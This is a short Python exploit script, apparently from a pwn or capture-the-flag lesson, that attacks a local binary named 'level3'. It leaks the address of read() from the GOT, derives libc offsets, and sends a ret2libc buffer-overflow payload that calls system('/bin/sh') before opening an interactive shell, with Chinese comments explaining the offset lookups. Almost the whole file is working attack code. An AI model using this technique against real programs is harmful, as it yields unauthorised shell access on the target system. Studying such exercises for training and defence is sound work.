#!/usr/bin/env python
# encoding:utf-8

import zio
import binascii

address = zio.l32(0x0804A00C) # read() 函数在 got 表中的保存的位置 , 通过 objdump -d | grep "read" 得到

Io = zio.zio("./level3")
Io.readline()
Io.write(address)
result = Io.readline()
read_address = int(result.replace("result: ", "")[2:-1], 16)

# 根据公式 : 
# read_address - read_lib_address = function_address - function_libc_address
# function_address = read_address - read_libc_address + function_libc_address

# libc 中的地址可以通过 : readelf -a libc.so.6_x86 | grep " function_name@" 获得
# sun@sun:~/pwnme/lessons/7hxzz/yao/2$ readelf -a libc.so.6_x86 | grep " read@"
#   958: 000d5980   101 FUNC    WEAK   DEFAULT   13 read@@GLIBC_2.0
# sun@sun:~/pwnme/lessons/7hxzz/yao/2$ readelf -a libc.so.6_x86 | grep " exit@"
#   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
# sun@sun:~/pwnme/lessons/7hxzz/yao/2$ readelf -a libc.so.6_x86 | grep " system@"
#  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

read_libc_address = 0x000D5980
system_libc_address = 0x0003ADA0
exit_libc_address = 0x0002E9D0

# 字符串 "/bin/sh" 的地址可以通过 : 
# > (gdb) find &system,+9999999,"/bin/sh" 获得
bin_sh_libc_address = 0x15b82b

offset = read_address - read_libc_address

system_address = zio.l32(offset + system_libc_address)
exit_address = zio.l32(offset + exit_libc_address)
bin_sh_address = zio.l32(offset + bin_sh_libc_address)

payload = "A" * 0x50 + "BBBBCCCCDDDD" + system_address + exit_address + bin_sh_address

Io.writeline(payload)
Io.interact()
